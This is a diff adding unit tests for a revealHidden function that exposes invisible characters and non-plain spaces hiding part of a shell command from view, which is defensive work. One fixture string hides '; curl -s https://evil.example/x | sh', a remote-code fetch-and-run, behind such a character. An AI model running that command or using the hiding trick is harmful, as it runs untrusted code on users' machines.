@@ -164,8 +164,55 @@ describe('a character that can make text read otherwise than it runs', () => {
     }
   });
 
-  it('leaves every space and every private-use character as it is', () => {
-    const left = [...every(/^\p{Zs}$/u), '\ue000', '\uf8ff', '\u{f0000}', '\u{ffffd}', '\u{100000}', '\u{10fffd}'];
+  it('leaves every space as it is, and private-use characters that show as a glyph or a box', () => {
+    const left = [...every(/^\p{Zs}$/u), '\ue000', '\ue0a0', '\uf8ff', '\u{f0000}', '\u{ffffd}', '\u{100000}', '\u{10fffd}'];
     for (const char of left) for (const mode of MODES) expect(revealHidden(`a${char}b`, mode), token(char)).toEqual({ text: `a${char}b`, hidden: false });
   });
 });
+
+describe('what Chrome on a Mac draws as a blank in the card’s fonts', () => {
+  // Every code point drawn on a canvas in the card's monospace and sans stacks, Chrome 157, macOS:
+  // besides the spaces, tab, newline and what is written out above, these drew no ink.
+  it('is written out wherever it is: a code point not assigned yet, and the two private-use characters Apple’s fonts draw as nothing', () => {
+    const blank = ['\u0e00', '\u181a', '\u187f', '\u18ab', '\ua48d', '\ufb0f', '\uf860', '\uf861'];
+    // Every unassigned code point, noncharacters too, but those kept for emoji to come (an emoji, kept whole).
+    const unassigned = [...blank.filter((char) => /\p{Cn}/u.test(char)), '\ufdd0', '\uffff', '\u{2fffe}', '\u{10ffff}', ...every(/^(?!\p{ExtPict})\p{Cn}$/u).filter((_, i) => i % 997 === 0)];
+    expect(unassigned.length).toBeGreaterThan(800);
+    for (const char of [...blank, ...unassigned]) {
+      for (const mode of MODES) expect(revealHidden(`echo done${char}# ok`, mode), token(char)).toEqual({ text: `echo done${token(char)}# ok`, hidden: true });
+    }
+  });
+
+  it('is written out in a command, a path or a name, which show in monospace, and left in words: U+FA2E and U+FA2F', () => {
+    for (const char of ['\ufa2e', '\ufa2f']) {
+      expect(revealHidden(`echo done${char}# ok`), token(char)).toEqual({ text: `echo done${token(char)}# ok`, hidden: true });
+      expect(revealHidden(`echo done${char}# ok`, { runs: 'shell' }).text, token(char)).toBe(`echo done${token(char)}# ok`);
+      expect(revealHidden(`\u90ce${char}`, { prose: true }), token(char)).toEqual({ text: `\u90ce${char}`, hidden: false });
+    }
+  });
+});
+
+describe('a space other than a plain one', () => {
+  const SPACES = every(/^\p{Zs}$/u).filter((char) => char !== ' ');
+
+  it('in a shell command, is written out where the shell reads it as part of a word', () => {
+    for (const char of SPACES) {
+      expect(revealHidden(`echo done${char}# ; curl -s https://evil.example/x | sh`, { runs: 'shell' }), token(char))
+        .toEqual({ text: `echo done${token(char)}# ; curl -s https://evil.example/x | sh`, hidden: true });
+      expect(revealHidden(`LC_ALL=C${char}cat ./setup.sh`, { runs: 'shell' }).text, token(char)).toBe(`LC_ALL=C${token(char)}cat ./setup.sh`);
+      // In quotes, a heredoc's body or a comment it is text.
+      for (const text of [`open "Screenshot at 10.00.00${char}AM.png"`, `git commit -m "$(cat <<'EOF'\n\u4fee\u590d${char}\u767b\u5f55\nEOF\n)"`, `npm test # a${char}b`]) {
+        expect(revealHidden(text, { runs: 'shell' }), token(char)).toEqual({ text, hidden: false });
+      }
+    }
+  });
+
+  it('between a program’s arguments shown joined by spaces, is written out wherever it is', () => {
+    for (const char of SPACES) expect(revealHidden(`npx -y "pkg${char}x"`, { runs: 'argv' }), token(char)).toEqual({ text: `npx -y "pkg${token(char)}x"`, hidden: true });
+  });
+
+  it('is left as it is in a path, a name, words, and a PowerShell command', () => {
+    for (const char of SPACES) for (const mode of MODES) expect(revealHidden(`Write-Output done${char}# ok`, mode), token(char)).toEqual({ text: `Write-Output done${char}# ok`, hidden: false });
+  });
+});
+
